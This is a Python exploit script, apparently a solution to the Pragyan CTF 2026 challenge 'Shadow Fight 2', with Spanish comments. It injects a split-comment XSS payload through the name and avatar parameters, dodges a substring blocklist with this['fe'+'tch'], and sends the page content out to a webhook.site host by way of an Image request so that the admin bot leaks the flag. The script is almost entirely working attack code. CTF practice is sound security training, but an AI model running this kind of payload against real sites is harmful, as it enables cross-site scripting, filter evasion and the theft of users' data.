#!/usr/bin/env python3
"""
Shadow Fight 2 - Split-Comment XSS Exploit
Pragyan CTF 2026

Técnica: Dividir payload entre name (/* abre comment) y avatar (*/ cierra comment + payload)
Bypass: this['fe'+'tch'] evita blocklist de substrings
"""

import requests
requests.packages.urllib3.disable_warnings()

BASE = "https://shadow-fight-2.ctf.prgy.in"
WEBHOOK = "https://webhook.site/2c5607c0-bc29-465a-94db-a3c18166c4c4"

# Name: rompe el script y abre comment multilínea (19 chars, límite 50)
name = "</script><script>/*"

# Avatar: cierra comment, ejecuta payload, comenta el resto
# Usa string concat para bypass: this['fe'+'tch'] en vez de fetch
payload = (
    "this['fe'+'tch']('/').then(r=>r.text()).then(t=>{"
    "new Image().src='" + WEBHOOK + "?f='"
    "+(t.match(/p_ctf[^<]+/)||['no'])[0]})"
)
avatar = "https://picsum.photos/*/" + payload + "//"

print(f"[*] Name: {name} ({len(name)} chars)")
print(f"[*] Avatar: {avatar[:80]}... ({len(avatar)} chars)")
print(f"[*] Webhook: {WEBHOOK}")

# Enviar al admin bot
r = requests.post(f"{BASE}/review",
                  params={"name": name, "avatar": avatar},
                  verify=False, timeout=10)
print(f"[*] Response: {r.text}")
print(f"[*] Revisar webhook para la flag")
